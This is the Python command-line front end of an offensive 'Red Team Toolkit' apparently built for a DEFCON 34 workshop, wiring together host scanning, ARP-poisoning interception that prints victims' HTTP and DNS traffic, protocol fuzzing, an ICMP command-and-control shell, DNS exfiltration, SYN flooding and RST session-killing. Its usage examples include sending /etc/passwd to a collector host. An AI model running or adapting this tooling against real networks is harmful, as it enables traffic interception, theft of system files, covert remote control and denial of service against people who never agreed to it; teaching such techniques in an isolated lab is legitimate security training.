#!/usr/bin/env python3
"""
Red Team Toolkit — Unified CLI

Provides a single entry point for all workshop modules.
Run with: sudo python3 redteam_toolkit/cli.py <command> [options]

Commands:
  recon    — host discovery + port scanning
  mitm     — ARP cache poisoning MitM
  fuzz     — protocol fuzzing
  c2       — ICMP command and control
  exfil    — DNS file exfiltration
  scan     — SYN port scan only
  flood    — TCP SYN flood
  rst      — RST injection to kill sessions

Examples:
  sudo python3 redteam_toolkit/cli.py recon  --target 192.168.56.0/24
  sudo python3 redteam_toolkit/cli.py mitm   --victim 192.168.56.2 --gateway 192.168.56.254
  sudo python3 redteam_toolkit/cli.py fuzz   --target 192.168.56.2 --port 9000
  sudo python3 redteam_toolkit/cli.py c2     --target 192.168.56.2
  sudo python3 redteam_toolkit/cli.py exfil  --file /etc/passwd --collector 192.168.56.1
"""

import argparse
import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from scapy.all import conf
conf.verb = 0
conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)

BANNER = r"""
  ██████  ██████   ██  ██   ████  ██████ ███  ███
  ██  ██  ██       ██ ██   ██  ██ ██  ██ ███████
  ██  ██  ██       ████    ██████ ██████ ██ █ ██
  ██  ██  ██       ██ ██   ██  ██ ██  ██ ██   ██
  ██████  ██████   ██  ██  ██  ██ ██  ██ ██   ██

  Red Team Toolkit — Offensive Packet Wizardry with Scapy
  DEFCON 34 Workshop
"""


# ── Subcommand handlers ───────────────────────────────────────────────────────

def cmd_recon(args):
    from redteam_toolkit.recon import full_recon, sweep, syn_scan

    if args.ports_only:
        print(f"[*] SYN scan: {args.target} ports {args.ports}")
        results = syn_scan(args.target, args.ports)
        open_p = {p: s for p, s in results.items() if s == "open"}
        print(f"[+] Open ports: {sorted(open_p.keys())}")
    elif "/" in args.target:
        print(f"[*] Host discovery: {args.target}")
        results = sweep(args.target, method=args.method or "arp", iface=args.iface)
        print(f"\n[+] Live hosts: {list(results.keys())}")
    else:
        print(f"[*] Full recon: {args.target}")
        full_recon(args.target, ports=args.ports)


def cmd_scan(args):
    from redteam_toolkit.recon import syn_scan
    print(f"[*] SYN scan: {args.target}  ports: {args.ports}")
    results = syn_scan(args.target, args.ports, timeout=args.timeout)
    open_p = {p: s for p, s in results.items() if s == "open"}
    print(f"[+] Open: {sorted(open_p.keys())}")
    closed = len([s for s in results.values() if s == "closed"])
    filtered = len([s for s in results.values() if s == "filtered"])
    print(f"[+] Summary: {len(open_p)} open, {closed} closed, {filtered} filtered")


def cmd_mitm(args):
    from redteam_toolkit.mitm import ArpMitm
    from scapy.all import IP, TCP, DNS, DNSQR, Raw

    def intercept(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            raw = pkt[Raw].load
            if b"Host:" in raw or raw[:4] in (b"GET ", b"POST"):
                lines = raw.split(b"\r\n")[:3]
                for line in lines:
                    if line:
                        print(f"  [HTTP] {line.decode(errors='replace')}")
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode(errors="replace").rstrip(".")
            src = pkt[IP].src if pkt.haslayer(IP) else "?"
            print(f"  [DNS]  {src} → {qname}")

    print(f"[*] ARP MitM: victim={args.victim} gateway={args.gateway}")
    print("[*] Press Ctrl-C to stop and restore caches\n")

    mitm = ArpMitm(
        args.victim, args.gateway,
        iface=args.iface or conf.iface,
        callback=intercept,
        interval=2.0,
    )
    mitm.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        mitm.stop()
        print("\n[+] Caches restored")


def cmd_fuzz(args):
    from redteam_toolkit.fuzzer import fuzz_service, fuzz_dns_service

    if args.dns:
        print(f"[*] DNS fuzzing: {args.target}")
        fuzz_dns_service(args.target, iters=args.iters)
    else:
        print(f"[*] Protocol fuzzing: {args.target}:{args.port}")
        crashes = fuzz_service(args.target, args.port, iters=args.iters, seed=args.seed)
        if crashes:
            print(f"\n[+] Found {len(crashes)} crash(es)!")
        else:
            print("\n[-] No crashes found")


def cmd_c2(args):
    from redteam_toolkit.covert import IcmpC2
    c2 = IcmpC2(args.target)
    print(f"[*] {c2}")
    if args.cmd:
        result = c2.run(args.cmd)
        print(result)
    else:
        c2.shell()


def cmd_exfil(args):
    from redteam_toolkit.covert import DnsExfil
    exfil = DnsExfil(args.collector, delay=args.delay)
    print(f"[*] {exfil}")
    exfil.send(args.file, session_id=args.session)


def cmd_flood(args):
    import subprocess
    cmd = [
        sys.executable,
        os.path.join(os.path.dirname(__file__), "..", "module4", "syn_flood.py"),
        "--target", args.target,
        "--port",   str(args.port),
        "--duration", str(args.duration),
        "--workers", str(args.workers),
    ]
    subprocess.run(cmd)


def cmd_rst(args):
    import subprocess
    cmd = [
        sys.executable,
        os.path.join(os.path.dirname(__file__), "..", "module4", "rst_injector.py"),
        "--target", args.target,
    ]
    if args.port:
        cmd += ["--port", str(args.port)]
    if args.continuous:
        cmd += ["--continuous"]
    subprocess.run(cmd)


# ── CLI setup ──────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="DC34 Red Team Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--iface", default=conf.iface, help="Network interface")

    subs = parser.add_subparsers(dest="command", required=True)

    # recon
    p_recon = subs.add_parser("recon", help="Host discovery and port scanning")
    p_recon.add_argument("--target", required=True, help="IP or CIDR range")
    p_recon.add_argument("--ports",  default="1-1024")
    p_recon.add_argument("--method", choices=["arp", "icmp", "tcp", "udp", "all"], default="arp")
    p_recon.add_argument("--ports-only", action="store_true", help="Skip host discovery")
    p_recon.add_argument("--iface")

    # scan
    p_scan = subs.add_parser("scan", help="SYN port scan")
    p_scan.add_argument("--target",  required=True)
    p_scan.add_argument("--ports",   default="1-1024")
    p_scan.add_argument("--timeout", type=float, default=2.0)

    # mitm
    p_mitm = subs.add_parser("mitm", help="ARP cache poisoning MitM")
    p_mitm.add_argument("--victim",  required=True)
    p_mitm.add_argument("--gateway", required=True)
    p_mitm.add_argument("--iface")

    # fuzz
    p_fuzz = subs.add_parser("fuzz", help="Protocol fuzzing")
    p_fuzz.add_argument("--target", required=True)
    p_fuzz.add_argument("--port",   type=int, default=9000)
    p_fuzz.add_argument("--iters",  type=int, default=1000)
    p_fuzz.add_argument("--seed",   type=int, default=None)
    p_fuzz.add_argument("--dns",    action="store_true", help="Fuzz DNS instead of custom protocol")

    # c2
    p_c2 = subs.add_parser("c2", help="ICMP C2 channel")
    p_c2.add_argument("--target", required=True)
    p_c2.add_argument("--cmd",    default=None, help="Single command (interactive if omitted)")

    # exfil
    p_exfil = subs.add_parser("exfil", help="DNS exfiltration")
    p_exfil.add_argument("--file",      required=True)
    p_exfil.add_argument("--collector", required=True)
    p_exfil.add_argument("--session",   default=None)
    p_exfil.add_argument("--delay",     type=float, default=0.2)

    # flood
    p_flood = subs.add_parser("flood", help="TCP SYN flood")
    p_flood.add_argument("--target",   required=True)
    p_flood.add_argument("--port",     type=int, default=80)
    p_flood.add_argument("--duration", type=int, default=30)
    p_flood.add_argument("--workers",  type=int, default=4)

    # rst
    p_rst = subs.add_parser("rst", help="RST injection to kill sessions")
    p_rst.add_argument("--target", required=True)
    p_rst.add_argument("--port",   type=int, default=0)
    p_rst.add_argument("--continuous", action="store_true")

    args = parser.parse_args()

    dispatch = {
        "recon": cmd_recon,
        "scan":  cmd_scan,
        "mitm":  cmd_mitm,
        "fuzz":  cmd_fuzz,
        "c2":    cmd_c2,
        "exfil": cmd_exfil,
        "flood": cmd_flood,
        "rst":   cmd_rst,
    }

    dispatch[args.command](args)


if __name__ == "__main__":
    main()
